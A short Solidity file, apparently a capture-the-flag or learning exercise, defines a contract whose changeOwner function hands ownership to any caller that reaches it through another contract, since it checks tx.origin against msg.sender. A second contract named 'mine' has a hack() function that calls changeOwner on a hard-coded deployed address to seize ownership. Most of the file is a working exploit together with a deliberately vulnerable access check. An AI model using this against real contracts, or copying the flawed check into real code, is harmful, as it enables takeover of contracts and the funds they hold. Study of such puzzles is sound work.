pragma solidity 0.8.6;

contract Test12 {
    
    address public owner;
    
    constructor() {
        owner = msg.sender;
    } 
    
    function changeOwner(address _owner) public {
        if(tx.origin != msg.sender){
            owner = _owner;
        }
    }
    
}

contract mine {
   
    function hack() public {
    Test12(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95).changeOwner(msg.sender);
    }
}
